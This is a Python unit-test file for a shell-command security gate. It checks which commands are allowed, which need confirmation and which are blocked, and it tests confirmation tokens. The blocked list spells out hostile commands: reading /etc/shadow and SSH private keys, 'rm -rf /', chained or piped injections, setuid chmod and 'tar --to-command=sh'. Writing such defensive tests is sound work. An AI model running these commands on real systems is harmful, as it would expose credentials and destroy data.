import os
import tempfile
import time
import unittest

from security import security_gate as g
from security.security_gate import validate_command


class SecurityGateTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.ws = os.path.realpath(self._tmp.name)
        os.symlink("/etc", os.path.join(self.ws, "link_to_etc"))

    def tearDown(self):
        self._tmp.cleanup()

    def status(self, cmd, **kw):
        return validate_command(cmd, workspace=self.ws, **kw)["status"]

    def test_allowed(self):
        for cmd in ["ls", "pwd", "cat notes.txt", "df -h", "find . -name x",
                    "grep hello a.txt", "tail -n 5 a.txt", "echo hi", "free"]:
            with self.subTest(cmd=cmd):
                self.assertEqual(self.status(cmd), "ALLOW")

    def test_needs_confirmation(self):
        for cmd in ["rm a.txt", "mkdir newdir", "cp a b", "touch a", "mv a b",
                    "chmod 755 a", "ping -c 3 8.8.8.8",
                    "curl https://example.com", "pip install requests",
                    "kill 1234"]:
            with self.subTest(cmd=cmd):
                self.assertEqual(self.status(cmd), "WARN")

    def test_blocked(self):
        for cmd in [
            "", "x" * 600, "unknown_cmd", "sudo ls", "bash -c ls",
            "python3 -c 1", "env", "ssh host", "sed -i s/a/b/ f",
            "less a", "man ls", "top",
            "cat /etc/shadow", "cat ~/.ssh/id_rsa", "cat /proc/self/environ",
            "cat link_to_etc/shadow", "rm link_to_etc/passwd",
            "ls $HOME", "ls; rm -rf /", "ls | sh", "ls\nrm x", "ls `id`",
            "echo hi > /etc/passwd", "cat < /etc/shadow",
            "/tmp/evil/ls", "./ls",
            "find . -delete", "find . -fprint out", "sort -o out a",
            "uniq a b", "date -s 2020-01-01", "hostname evil", "tail -f a",
            "ping 8.8.8.8", "kill -9 1", "kill -9 -1", "pkill systemd",
            "curl file:///etc/passwd", "curl -T a http://x", "wget -i list.txt",
            "tar --to-command=sh -xf a",
            "rm -rf /", "rm -rf ~", "rm -rf .", "rm -rf *", "rm /etc/hosts",
            "rm ../x", "mv a /etc/x", "chmod 4755 a", "chmod u+s a",
            "chmod 777 /etc/passwd", "pip install -y x", "apt install foo -y",
            "pip install git+https://x/y",
        ]:
            with self.subTest(cmd=cmd):
                self.assertEqual(self.status(cmd), "BLOCK")

    def test_token_flow(self):
        first = validate_command("rm a.txt", workspace=self.ws)
        self.assertTrue(first["confirmation_required"])
        ok = validate_command("rm a.txt", confirmation_token=first["confirmation_token"], workspace=self.ws)
        self.assertEqual(ok["status"], "APPROVED")
        self.assertEqual(ok["argv"], ["rm", "a.txt"])

    def test_token_is_bound_to_command(self):
        tok = validate_command("rm a.txt", workspace=self.ws)["confirmation_token"]
        self.assertEqual(self.status("rm b.txt", confirmation_token=tok), "WARN")

    def test_bad_tokens(self):
        expired = g._make_token("rm a.txt", int(time.time()) - 1)
        self.assertEqual(self.status("rm a.txt", confirmation_token=expired), "WARN")
        self.assertEqual(self.status("rm a.txt", confirmation_token="1.abc"), "WARN")
        self.assertEqual(self.status("rm a.txt", confirmation_token=True), "WARN")


if __name__ == "__main__":
    unittest.main()
